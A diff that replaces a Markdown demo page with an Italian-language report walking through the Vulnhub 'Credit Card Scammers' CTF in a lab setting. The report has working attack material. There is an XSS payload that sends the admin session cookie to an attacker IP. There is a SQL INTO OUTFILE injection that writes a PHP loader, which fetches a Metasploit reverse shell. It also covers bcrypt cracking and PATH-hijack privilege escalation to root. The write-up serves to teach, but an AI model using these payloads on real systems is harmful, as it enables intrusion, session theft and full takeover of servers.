@@ -1,709 +1,210 @@
-# My Open Publishing Space
+# Report Cybersecurity
 
-## Create, Share and Collaborate
+## Introduzione
 
-![Photo of Mountain](images/mountain.jpg)
+La demo consiste nella risoluzione di una challenge Catch The Flag (CTF) di [Vulnhub](https://www.vulnhub.com/entry/credit-card-scammers-1,479/).
 
-[Docsify](https://docsify.js.org/#/) can generate article, portfolio and documentation websites on the fly. Unlike Docusaurus, Hugo and many other Static Site Generators (SSG), it does not generate static html files. Instead, it smartly loads and parses your Markdown content files and displays them as a website.
+L'obiettivo è quello di ottenere privilegi root su una macchina virtuale Linux preconfigurata, cercando 3 flag durante il percorso. Lo scenario è quello di una rete popolata da sole due macchine, quella attaccante (Kali Linux) e quella obiettivo. L'attaccante può comunicare direttamente con l'obiettivo e ha a disposizione software utili per sfruttarne le vulnerabilita.
 
-## Introduction
+NOTA: La risoluzione è stata condotta seguento il [writeup](https://www.bootlesshacker.com/credit-card-scammers-ctf-walkthrough/)  creato dall'autore della macchina virtuale. In alcuni punti, l'esecuzione è stata condotta seguendo un ordine leggermente diverso.
+Per la comprensione di comandi e script usati sono state consultate diverse risorse online, tra cui anche ChatGPT. 
 
-**Markdown** is a system-independent markup language that is easier to learn and use than **HTML**.
+I principali passi per la risoluzione consistono in:
 
-![The Markdown Mark](images/markdown-red.png)  
-_Figure 1: The Markdown Mark_
-
-Some of the key benefits are:
-
-1. Markdown is simple to learn, with minimal extra characters, so it's also quicker to write content.
-2. Less chance of errors when writing in markdown.
-3. Produces valid XHTML output.
-4. Keeps the content and the visual display separate, so you cannot mess up the look of your site.
-5. Write in any text editor or Markdown application you like.
-6. Markdown is a joy to use!
-
-John Gruber, the author of Markdown, puts it like this:
-
-> The overriding design goal for Markdown’s formatting syntax is to make it as readable as possible. The idea is that a Markdown-formatted document should be publishable as-is, as plain text, without looking like it’s been marked up with tags or formatting instructions. While Markdown’s syntax has been influenced by several existing text-to-HTML filters, the single biggest source of inspiration for Markdown’s syntax is the format of plain text email.
-> -- <cite>John Gruber</cite>
+- Ricognizione rete ed enumerazione servizi
+- Session hijacking tramite XSS injection
+- Ottenimento reverse shell
+- Privilege escalation
 
 
-Without further delay, let us go over the main elements of Markdown and what the resulting HTML looks like:
+## Ricognizione ed enumerazione
 
-### Headings
+Per prima cosa è necessario scansionare rete in modo da identificare l'indirizzo ip della macchina obiettivo. Tra i vari software disponibili, è stato scelto di utilizzare *nmap*, tramite cui, con opzioni appropriate, e possibile rilvare direttamente anche i servizi disponibili sui nodi trovati.
+<p align="center">
+<img src="img/nmap2.png" width=80%/>
+</p>
 
-Headings from `h1` through `h6` are constructed with a `#` for each level:
+La porta 80 della macchina obiettivo risulta aperta per un web server. È possibile visitare il sito web ospitato, che risulta essere adibito alla vendita di prodotti medici. 
 
-```markdown
-# h1 Heading
-## h2 Heading
-### h3 Heading
-#### h4 Heading
-##### h5 Heading
-###### h6 Heading
+## XSS injection e session hijacking
+
+Sul sito, selezionando uno dei prodotti sul catalogo, è possibile compilare dei form per effettuarne l'ordine. Tali form potrebbero essere vulnerabili ad attacchi di tipo Cross-Site Scripting (XSS), che di solito consistono nell'injection di codice tramite input da webapp il cui contenuto non viene opportunamente validato o sanato: il codice malevolo viene inviato a un utente lato server, che lo mette ignaramente in esecuzione.
+
+L'assunzione che viene fatta in questo scenario è la seguente: gli ordini effettuati vengono revisionati da un utente gestore del server, il quale dovrebbe avere su di esso privilegi amministrativi. L'idea è quindi quella di iniettare in uno dei form del codice per ottenere l'id di sessione dell'amministratore per poi impersonarlo (*session hijacking*). Il codice malevolo andrà in esecuzione non appena l'ordine fittizio verrà esaminato.
+
+Il codice da iniettare è il seguente:
+
+```javascript
+<script>
+document.write('<img src="http://192.168.56.1/'+document.cookie+'" width=0 height=0 border=0 />');
+</script>
 ```
 
-Renders to:
+Lo script crea una pagina html in cui viene inserita un'immagine di dimensione nulla: per come è costruito l'url, alla macchina attaccante viene richiesta una risorsa il cui nome corrisponde al cookie di sessione del'amministratore. Quando il browser dell'amministratore apre l'ordine fittizio da revisionare, esso invia la richiesta per ottenere la risorsa a un server sulla macchina attaccante. 
 
-<h1> h1 Heading </h1>
-<h2>  h2 Heading </h2>
-<h3>  h3 Heading </h3>
-<h4>  h4 Heading </h4>
-<h5>  h5 Heading </h5>
-<h6>  h6 Heading </h6>
+Stando a [questa categorizzazione](https://owasp.org/www-community/attacks/xss/), quello in questione è un attacco XSS di tipo reflected, in cui il contenuto dell'injection viene direttamente eseguito sul web server obiettivo e non viene memorizzato (come invece accade negli attacchi XSS di tipo stored, che sono infatti caratterizzati da persistenza). 
 
-HTML:
+In modo che la macchina attaccante possa accettare la richiesta del webserver è necessario avviare un server:
 
-```html
-<h1>h1 Heading</h1>
-<h2>h2 Heading</h2>
-<h3>h3 Heading</h3>
-<h4>h4 Heading</h4>
-<h5>h5 Heading</h5>
-<h6>h6 Heading</h6>
+```bash
+python -m http.server 80 
 ```
 
-### Comments
+Poco dopo l'injection, dal log del server è visibile la richiesta per l'immagine dello script, in cui è esposto il cookie di sessione dell'amministratore. 
 
-Comments should be HTML compatible
+Si può notare che questa injection è categorizzabile come remota, senza autenticazione ma che richiede necessariamente un'azione da parte di un utente per la realizzazione effettiva.
 
-```html
-<!--
-This is a comment
--->
-```
-Comment below should **NOT** be seen:
+<p align="center">
+<img src="img/cookie1.png" width=80%/>
+</p>
 
-<!--
-This is a comment
--->
+Per capire dove sfruttare il cookie di sessione è opportuno scansionare le directory del web server in cerca di aree riservate agli amministratori. Per fare ciò si può usare dirb, un fuzzing tool che, dato un dizionario di nomi di file e directory comuni, invia richieste al server con tali nomi in modo da trovare risorse non puntate direttamente da dei link.
 
-### Horizontal Rules
+Tra le varie directory trovate, risalta quella ```/_admin```. Visitandola, si apre una pagina con dei link a delle subdirectory. Visitando il link alla directory ```dist/```, si accede a un pannello di login per l'area amministrativa. 
 
-The HTML `<hr>` element is for creating a "thematic break" between paragraph-level elements. In markdown, you can create a `<hr>` with any of the following:
+Non essendo in possesso di credenziali, si può impersonare l'amministratore del webserver usando il cookie di sessione ottenuto al passo precedente. Per intercettare e modificare la richiesta in uscita dal browser è stato scelto di usare il proxy burp.
 
-* `___`: three consecutive underscores
-* `---`: three consecutive dashes
-* `***`: three consecutive asterisks
+<p align="center">
+<img src="img/burp1.png" width=70%/>
+</p>
 
-renders to:
+## Reverse shell
 
-___
+Valorizzando opportunamente il campo ```Cookie``` e inoltrando la richiesta, si accede al pannello amministrativo, in cui sono visibili gli ordini di altri clienti. In un submenu è presente un link denominato ```database admin```, che porta a una pagina interattiva tramite cui interagire con il database del negozio. Il form permette solamente di inserire o rimuovere dati, non di interrogare il database. È importante notare che l'interazione con il database è diretta, non mediata da prepared statement e stored procedures, il che rende il webserver vulnerabile a SQL injection.
 
----
+In SQL è possibile scrivere l'output di una query in un file specificato: ammesso che l'utente del database abbia i privilegi necessari, è possibile farlo anche all'interno del webserver. Si può dunque tentare di effettuare injection di codice tramite la query SQL. La query test, con payload php, è la seguente:
 
-***
-
-
-### Body Copy
-
-Body copy written as normal, plain text will be wrapped with `<p></p>` tags in the rendered HTML.
-
-So this body copy:
-
-```markdown
-Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.
-```
-renders to this HTML:
-
-```html
-<p>Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.</p>
+```php
+SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/html/phpinfo.php'
 ```
 
-### Emphasis
+Il comando ```SELECT``` genera come output il codice nel payload, ```INTO OUTFILE``` invece scrive tale output nel file specificato di seguito. Il path ```/var/www/html/phpinfo.php``` è tra quelli di default più comuni usati dai webserver. Quando aperto su browser, il codice viene eseguito. La funzione ```phpinfo()``` restituisce informazioni sul webserver. 
 
-#### Bold
-For emphasizing a snippet of text with a heavier font-weight.
+Il fatto che la pagina generata dal file ```phpinfo.php``` risulta visitabile indica che l'injection è andata a buon fine.
 
-The following snippet of text is **rendered as bold text**.
+Per sfruttare questa vulnerabilità al meglio, il payload php della SQL injection può essere sostituito con uno che genera una reverse shell sul webserver, in modo da ottenere accesso persistente alla macchina obiettivo. Tale payload può essere facilmente generato usando meterpreter, parte del framework Metasploit.
 
-```markdown
-**rendered as bold text**
+I comandi e parametri per la creazione del payload sono i seguenti:
+
 ```
-renders to:
-
-**rendered as bold text**
-
-and this HTML
-
-```html
-<strong>rendered as bold text</strong>
-```
-
-#### Italics
-For emphasizing a snippet of text with italics.
-
-The following snippet of text is _rendered as italicized text_.
-
-```markdown
-_rendered as italicized text_
+sudo msfconsole
+   use exploit/multi/script/web_delivery
+   set target PHP
+   set payload php/meterpreter/reverse_tcp
+   set LHOST 192.168.56.1
+   set LPORT 53
+   set SRVPORT 443
+   run
 ```
 
-renders to:
+dove LHOST e LPORT sono rispettivamente indirizzo ip e porta su cui sta in ascolto la macchina attaccante per comunicare con la reverse shell, SRVPORT invece è la porta usata dal server Metasploit per servire il payload meterpreter. Le porte usate sono quelle usate più comunemente, in modo da evitare l'interferenza di firewall.
 
-_rendered as italicized text_
+Il payload generato è il seguente:
 
-and this HTML:
+```php
+php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.56.1:443/QDtxspMboNPbjD', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
+```
 
-```html
-<em>rendered as italicized text</em>
+Inserendo la porzione tra virgolette in una query SQL, si ottiene il codice da iniettare nel form:
+
+```php
+SELECT '<?php eval(file_get_contents('http://192.168.56.1:443/QDtxspMboNPbjD', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]))); ?>' INTO OUTFILE '/var/www/html/shell.php'
 ```
 
 
-#### strikethrough
-In GFM (GitHub flavored Markdown) you can do strikethroughs.
+La funzione ```eval()``` valorizza la stringa in argomento come codice php. In questo caso, ad essere valorizzato è il contenuto del file ottenuto e convertito in stringa tramite la funzione ```file_get_contents()```.  La funzione ha come argomento un URL, il cui host è la macchina attaccante; il file specificato viene servito da metasploit e contiene il codice malevolo per la creazione della reverse shell. Le opzioni aggiuntive servono per disattivare la verifica del certificato SSL.
 
-```markdown
-~~Strike through this text.~~
-```
-Which renders to:
+Il codice iniettato viene scritto su un file nel filesystem del webserver, sul quale entra in esecuzione una volta aperto dall'attaccante tramite browser.
 
-~~Strike through this text.~~
+Questa injection è differente da quella al passo precedente, in quanto, pur essendo remota, necessita di autenticazione (effettuata tramite cookie di sessione) ma non di un'azione da parte di un utente lato webserver.
 
-HTML:
+A questo punto, su Metasploit viene aperta una sessione tramite cui si può interagire con la macchina obiettivo. 
 
-```html
-<del>Strike through this text.</del>
-```
+<p align="center">
+<img src="img/meterpreter2.png" width=80%/>
+</p>
 
-### Blockquotes
-For quoting blocks of content from another source within your document.
-
-Add `>` before any text you want to quote.
-
-```markdown
-> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.
-```
-
-Renders to:
-
-> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.
-
-and this HTML:
-
-```html
-<blockquote>
-  <p><strong>Fusion Drive</strong> combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.</p>
-</blockquote>
-```
-
-Blockquotes can also be nested:
-
-```markdown
-> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
-Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
->> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
-odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.
-```
-
-Renders to:
-
-> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
-Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
->> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
-odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.
-
-### Lists
-
-#### Unordered
-A list of items in which the order of the items does not explicitly matter.
-
-You may use any of the following symbols to denote bullets for each list item:
-
-```markdown
-* valid bullet
-- valid bullet
-+ valid bullet
-```
-
-For example
-
-```markdown
-+ Lorem ipsum dolor sit amet
-+ Consectetur adipiscing elit
-+ Integer molestie lorem at massa
-+ Facilisis in pretium nisl aliquet
-+ Nulla volutpat aliquam velit
-  - Phasellus iaculis neque
-  - Purus sodales ultricies
-  - Vestibulum laoreet porttitor sem
-  - Ac tristique libero volutpat at
-+ Faucibus porta lacus fringilla vel
-+ Aenean sit amet erat nunc
-+ Eget porttitor lorem
-```
-Renders to:
-
-+ Lorem ipsum dolor sit amet
-+ Consectetur adipiscing elit
-+ Integer molestie lorem at massa
-+ Facilisis in pretium nisl aliquet
-+ Nulla volutpat aliquam velit
-  - Phasellus iaculis neque
-  - Purus sodales ultricies
-  - Vestibulum laoreet porttitor sem
-  - Ac tristique libero volutpat at
-+ Faucibus porta lacus fringilla vel
-+ Aenean sit amet erat nunc
-+ Eget porttitor lorem
-
-And this HTML
-
-```html
-<ul>
-  <li>Lorem ipsum dolor sit amet</li>
-  <li>Consectetur adipiscing elit</li>
-  <li>Integer molestie lorem at massa</li>
-  <li>Facilisis in pretium nisl aliquet</li>
-  <li>Nulla volutpat aliquam velit
-    <ul>
-      <li>Phasellus iaculis neque</li>
-      <li>Purus sodales ultricies</li>
-      <li>Vestibulum laoreet porttitor sem</li>
-      <li>Ac tristique libero volutpat at</li>
-    </ul>
-  </li>
-  <li>Faucibus porta lacus fringilla vel</li>
-  <li>Aenean sit amet erat nunc</li>
-  <li>Eget porttitor lorem</li>
-</ul>
-```
-
-#### Ordered
-
-A list of items in which the order of items does explicitly matter.
-
-```markdown
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-```
-Renders to:
-
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-
-And this HTML:
-
-```html
-<ol>
-  <li>Lorem ipsum dolor sit amet</li>
-  <li>Consectetur adipiscing elit</li>
-  <li>Integer molestie lorem at massa</li>
-  <li>Facilisis in pretium nisl aliquet</li>
-  <li>Nulla volutpat aliquam velit</li>
-  <li>Faucibus porta lacus fringilla vel</li>
-  <li>Aenean sit amet erat nunc</li>
-  <li>Eget porttitor lorem</li>
-</ol>
-```
-
-**TIP**: If you just use `1.` for each number, Markdown will automatically number each item. For example:
-
-```markdown
-1. Lorem ipsum dolor sit amet
-1. Consectetur adipiscing elit
-1. Integer molestie lorem at massa
-1. Facilisis in pretium nisl aliquet
-1. Nulla volutpat aliquam velit
-1. Faucibus porta lacus fringilla vel
-1. Aenean sit amet erat nunc
-1. Eget porttitor lorem
-```
-
-Renders to:
-
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-
-### Code
-
-#### Inline code
-Wrap inline snippets of code with `` ` ``.
-
-```markdown
-In this example, `<section></section>` should be wrapped as **code**.
-```
-
-Renders to:
-
-In this example, `<section></section>` should be wrapped with **code**.
-
-HTML:
-
-```html
-<p>In this example, <code>&lt;section&gt;&lt;/section&gt;</code> should be wrapped with <strong>code</strong>.</p>
-```
-
-#### Indented code
-
-Or indent several lines of code by at least four spaces, as in:
-
-<pre>
-  // Some comments
-  line 1 of code
-  line 2 of code
-  line 3 of code
-</pre>
-
-Renders to:
-
-    // Some comments
-    line 1 of code
-    line 2 of code
-    line 3 of code
-
-HTML:
-
-```html
-<pre>
-  <code>
-    // Some comments
-    line 1 of code
-    line 2 of code
-    line 3 of code
-  </code>
-</pre>
-```
-
-
-#### Block code "fences"
-
-Use "fences"  ```` ``` ```` to block in multiple lines of code.
-
-<pre>
-``` markup
-Sample text here...
-```
-</pre>
-
+Per ottenere una shell interattiva si usano i seguenti comandi: 
 
 ```
-Sample text here...
+shell
+python2.7 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-HTML:
+Meterpreter permetterebbe di interagire con la macchina obiettivo senza generare nuovi processi: lanciare una shell ha come effetto quello di generare un nuovo processo, che in uno scenario reale potrebbe rendere l'attaccante più esposto.
 
-```html
-<pre>
-  <code>Sample text here...</code>
-</pre>
+## Privilege Escalation
+
+Con il comando ```whoami```, si può vedere che si sta impersonando l'account di nome apache. Inoltre nella directory corrente, ```/var/www/html```, si trova il primo flag. 
+
+Nella stessa directory è presente una cartella settings, contenente il file ```config.php```. Al suo interno ci sono le infomazioni del database per la gestione degli ordini del negozio, denominato ```orders```, tra cui anche la password in chiaro per accedervi. 
+
+<p align="center">
+<img src="img/config.png" width=30%/>
+</p>
+
+Nel database ci sono due tabelle, ```orders``` e ```users```. La seconda tabella contiene le credenziali di due account.
+
+<p align="center">
+<img src="img/users.png" width=60%/>
+</p>
+
+Le password sono salvate come hash (in formato bcrypt). Può essere utile copiarle in un file sulla macchina attaccante per effettuarne il cracking in un secondo momento.
+
+Uscendo dal database e navigando alla directory ```/home```, si vede che è presente la home anche di un altro account, *moneygrabber*, il cui nome assomiglia a uno dei due trovati nel database, *m0n3y6r4bb3r*. 
+
+Vista la possibilità che password di account locale e di utente del database coincidano, si procede con il cracking della password di m0n3y6r4bb3r. Per fare ciò è stato scelto il tool John the Ripper, prenistallato nella macchina attaccante. Il comando è il seguente: 
+
+```bash
+john -format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt /home/matteo/Downloads/tocrack.txt
 ```
 
-#### Syntax highlighting
+dove sono specificati il formato dell'hash, la wordlist da usare e il file contentente il singolo hash da forzare. 
 
-GFM, or "GitHub Flavored Markdown" also supports syntax highlighting. To activate it, simply add the file extension of the language you want to use directly after the first code "fence", ` ```js `, and syntax highlighting will automatically be applied in the rendered HTML. For example, to apply syntax highlighting to JavaScript code:
+La password risulta essere **delta1** e, tendando l'accesso, si rivela essere la stessa dell'account locale . In ```/home/moneyrabber``` si trova il secondo flag.
 
-<pre>
-```js
-grunt.initConfig({
-  assemble: {
-    options: {
-      assets: 'docs/assets',
-      data: 'src/data/*.{json,yml}',
-      helpers: 'src/custom-helpers.js',
-      partials: ['src/partials/**/*.{hbs,md}']
-    },
-    pages: {
-      options: {
-        layout: 'default.hbs'
-      },
-      files: {
-        './': ['src/templates/pages/index.hbs']
-      }
-    }
-  }
-};
-```
-</pre>
+Nella home di moneybgrabber è presente anche il file ```backup.sh```:
 
-Renders to:
-
-```js
-grunt.initConfig({
-  assemble: {
-    options: {
-      assets: 'docs/assets',
-      data: 'src/data/*.{json,yml}',
-      helpers: 'src/custom-helpers.js',
-      partials: ['src/partials/**/*.{hbs,md}']
-    },
-    pages: {
-      options: {
-        layout: 'default.hbs'
-      },
-      files: {
-        './': ['src/templates/pages/index.hbs']
-      }
-    }
-  }
-};
+```bash
+#!/bin/bash
+tar -cf mysql.tar /var/lib/mysql
+sleep 30
 ```
 
-### Tables
-Tables are created by adding pipes as dividers between each cell, and by adding a line of dashes (also separated by bars) beneath the header. Note that the pipes do not need to be vertically aligned.
+Lo script non è modficabile dall'account attuale. Al suo interno però viene chiamato il comando ```tar```, che serve per la compressione/decompressione di file. È importante notare che il comando viene chiamato direttamente, senza che sia specificato il path dell'eseguibile. In Linux, se il path di un eseguibile non è specificato, il sistema operativo cerca il relativo eseguibile tra quelli inseriti nella variabile d'ambiente ```$PATH```, una lista ordinata di directory separate dal carattere ' : '.
 
+Il primo passo chiave è il seguente: aggiungere una entry al contenuto di ```$PATH``` , ovvero una directory che contiene un nuovo esegubile ```tar``` che, anziché eseguire la compressione di un file, generi una shell. È fondamentale che il nuovo path sia inserito al primo posto nella lista, in modo che il sistema operativo lo veda per primo. Si può notare che se il contenuto di ```$PATH``` venisse sovrascritto completamente, gli eseguibili dei comandi Linux usati da terminale non sarebbero più trovati e sarebbe necessario digitare i path completi ogni volta. 
 
-```markdown
-| Option | Description |
-| ------ | ----------- |
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
+Il contenuto di ```$PATH``` è sovrascrivibile con il comando seguente:
+
+```bash
+export PATH=/tmp:/home/moneygrabber/.local/bin:/home/moneygrabber/bin:/usr/local/bin:/usr/bin
 ```
 
-Renders to:
+dove la prima directory è quella scelta per contenere l'eseguibile malevolo, creato con i seguentu comandi:
 
-| Option | Description |
-| ------ | ----------- |
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-
-And this HTML:
-
-```html
-<table>
-  <tr>
-    <th>Option</th>
-    <th>Description</th>
-  </tr>
-  <tr>
-    <td>data</td>
-    <td>path to data files to supply the data that will be passed into templates.</td>
-  </tr>
-  <tr>
-    <td>engine</td>
-    <td>engine to be used for processing templates. Handlebars is the default.</td>
-  </tr>
-  <tr>
-    <td>ext</td>
-    <td>extension to be used for dest files.</td>
-  </tr>
-</table>
+```
+cd /tmp
+echo "/bin/bash" > tar
+chmod +x tar
 ```
 
-### Right aligned text
+Per generare una shell con privilegi root, è necessario eseguire ```backup.sh``` con i medesimi privilegi. Non conoscendo la password per l'account root, servirebbe che su ```backup.sh``` fosse impostato il bit SUID che in Linux permette di lanciarelo script con privilegi del possessore, in questo caso root. 
 
-Adding a colon on the right side of the dashes below any heading will right align text for that column.
+Si procede dunque trovando tutti gli eseguibili con impostato il bit SUID per poi individuarne uno che chiama lo script ```backup.sh``` e lanciarlo. Il comando per listare gli eseguibili di interesse è il seguente:
 
-```markdown
-| Option | Description |
-| ------:| -----------:|
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
+```bash
+find / -perm -u=s -type f 2>/dev/null
 ```
 
-| Option | Description |
-| ------:| -----------:|
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
+Nell'output compare l'eseguibile ```/usr/bin/backup```. Per vederne il contenuto si può usare il comando ```strings```, che restituisce stringhe di caratteri da file non di testo. Si vede che ```backup.sh``` viene chiamato da ```backup```.
 
-### Links
+<p align="center">
+<img src="img/strings1.png" width=50%/>
+</p>
 
-#### Basic link
+ Ora basta eseguirlo per ottenere una shell con privilegi root. Accedendo alla directory ```/root``` si ottiene il terzo flag.
 
-```markdown
-[Assemble](http://assemble.io)
-```
-
-Renders to (hover over the link, there is no tooltip):
-
-[Assemble](http://assemble.io)
-
-HTML:
-
-```html
-<a href="http://assemble.io">Assemble</a>
-```
-
-
-#### Add a title
-
-```markdown
-[Upstage](https://github.com/upstage/ "Visit Upstage!")
-```
-
-Renders to (hover over the link, there should be a tooltip):
-
-[Upstage](https://github.com/upstage/ "Visit Upstage!")
-
-HTML:
-
-```html
-<a href="https://github.com/upstage/" title="Visit Upstage!">Upstage</a>
-```
-
-#### Named Anchors
-
-Named anchors enable you to jump to the specified anchor point on the same page. For example, each of these chapters:
-
-```markdown
-# Table of Contents
-  * [Chapter 1](#chapter-1)
-  * [Chapter 2](#chapter-2)
-  * [Chapter 3](#chapter-3)
-```
-will jump to these sections:
-
-```markdown
-### Chapter 1 <a id="chapter-1"></a>
-Content for chapter one.
-
-### Chapter 2 <a id="chapter-2"></a>
-Content for chapter one.
-
-### Chapter 3 <a id="chapter-3"></a>
-Content for chapter one.
-```
-**NOTE** that specific placement of the anchor tag seems to be arbitrary. They are placed inline here since it seems to be unobtrusive, and it works.
-
-### Images
-Images have a similar syntax to links but include a preceding exclamation point.
-
-```markdown
-![Image of Minion](https://octodex.github.com/images/minion.png)
-```
-![Image of Minion](https://octodex.github.com/images/minion.png)
-
-and using a local image (which also displays in GitHub):
-
-```markdown
-![Image of Octocat](images/octocat.jpg)
-```
-![Image of Octocat](images/octocat.jpg)
-
-## Topic One  
-
-Lorem markdownum in maior in corpore ingeniis: causa clivo est. Rogata Veneri terrebant habentem et oculos fornace primusque et pomaria et videri putri, levibus. Sati est novi tenens aut nitidum pars, spectabere favistis prima et capillis in candida spicis; sub tempora, aliquo.
-
-## Topic Two
-
-Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
-Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
-tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
-qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
-telum spectatorem at aequor.
-
-## Topic Three
-
-### Overview
-
-Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
-Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
-tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
-qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
-telum spectatorem at aequor.
-
-### Subtopic One
-
-Lorem markdownum murmure fidissime suumque. Nivea agris, duarum longaeque Ide
-rugis Bacchum patria tuus dea, sum Thyneius liquor, undique. **Nimium** nostri
-vidisset fluctibus **mansit** limite rigebant; enim satis exaudi attulit tot
-lanificae [indice](http://www.mozilla.org/) Tridentifer laesum. Movebo et fugit,
-limenque per ferre graves causa neque credi epulasque isque celebravit pisces.
-
-- Iasone filum nam rogat
-- Effugere modo esse
-- Comminus ecce nec manibus verba Persephonen taxo
-- Viribus Mater
-- Bello coeperunt viribus ultima fodiebant volentem spectat
-- Pallae tempora
-
-#### Fuit tela Caesareos tamen per balatum
-
-De obstruat, cautes captare Iovem dixit gloria barba statque. Purpureum quid
-puerum dolosae excute, debere prodest **ignes**, per Zanclen pedes! *Ipsa ea
-tepebat*, fiunt, Actoridaeque super perterrita pulverulenta. Quem ira gemit
-hastarum sucoque, idem invidet qui possim mactatur insidiosa recentis, **res
-te** totumque [Capysque](http://tumblr.com/)! Modo suos, cum parvo coniuge, iam
-sceleris inquit operatus, abundet **excipit has**.
-
-In locumque *perque* infelix hospite parente adducto aequora Ismarios,
-feritatis. Nomine amantem nexibus te *secum*, genitor est nervo! Putes
-similisque festumque. Dira custodia nec antro inornatos nota aris, ducere nam
-genero, virtus rite.
-
-- Citius chlamydis saepe colorem paludosa territaque amoris
-- Hippolytus interdum
-- Ego uterque tibi canis
-- Tamen arbore trepidosque
-
-#### Colit potiora ungues plumeus de glomerari num
-
-Conlapsa tamen innectens spes, in Tydides studio in puerili quod. Ab natis non
-**est aevi** esse riget agmenque nutrit fugacis.
-
-- Coortis vox Pylius namque herbosas tuae excedere
-- Tellus terribilem saetae Echinadas arbore digna
-- Erraverit lectusque teste fecerat
-
-Suoque descenderat illi; quaeritur ingens cum periclo quondam flaventibus onus
-caelum fecit bello naides ceciderunt cladis, enim. Sunt aliquis.
-
-### Subtopic Two
-
-Lorem *markdownum saxum et* telum revellere in victus vultus cogamque ut quoque
-spectat pestiferaque siquid me molibus, mihi. Terret hinc quem Phoebus? Modo se
-cunctatus sidera. Erat avidas tamen antiquam; ignes igne Pelates
-[morte](http://www.youtube.com/watch?v=MghiBW3r65M) non caecaque canam Ancaeo
-contingat militis concitus, ad!
-
-#### Et omnis blanda fetum ortum levatus altoque
-
-Totos utinamque nutricis. Lycaona cum non sine vocatur tellus campus insignia et
-absumere pennas Cythereiadasque pericula meritumque Martem longius ait moras
-aspiciunt fatorum. Famulumque volvitur vultu terrae ut querellas hosti deponere
-et dixit est; in pondus fonte desertum. Condidit moras, Carpathius viros, tuta
-metum aethera occuluit merito mente tenebrosa et videtur ut Amor et una
-sonantia. Fuit quoque victa et, dum ora rapinae nec ipsa avertere lata, profugum
-*hectora candidus*!
-
-#### Et hanc
-
-Quo sic duae oculorum indignos pater, vis non veni arma pericli! Ita illos
-nitidique! Ignavo tibi in perdam, est tu precantia fuerat
-[revelli](http://jaspervdj.be/).
-
-Non Tmolus concussit propter, et setae tum, quod arida, spectata agitur, ferax,
-super. Lucemque adempto, et At tulit navem blandas, et quid rex, inducere? Plebe
-plus *cum ignes nondum*, fata sum arcus lustraverat tantis!
-
-#### Adulterium tamen instantiaque puniceum et formae patitur
-
-Sit paene [iactantem suos](http://www.metafilter.com/) turbineo Dorylas heros,
-triumphos aquis pavit. Formatae res Aeolidae nomen. Nolet avum quique summa
-cacumine dei malum solus.
-
-1. Mansit post ambrosiae terras
-2. Est habet formidatis grandior promissa femur nympharum
-3. Maestae flumina
-4. Sit more Trinacris vitasset tergo domoque
-5. Anxia tota tria
-6. Est quo faece nostri in fretum gurgite
-
-Themis susurro tura collo: cunas setius *norat*, Calydon. Hyaenam terret credens
-habenas communia causas vocat fugamque roganti Eleis illa ipsa id est madentis
-loca: Ampyx si quis. Videri grates trifida letum talia pectus sequeretur erat
-ignescere eburno e decolor terga.
-
-> Note: Example page content from [GetGrav.org](https://learn.getgrav.org/17/content/markdown), included to demonstrate the portability of Markdown-based content
+<p align="center">
+<img src="img/root1.png" width=50%/>
+</p>
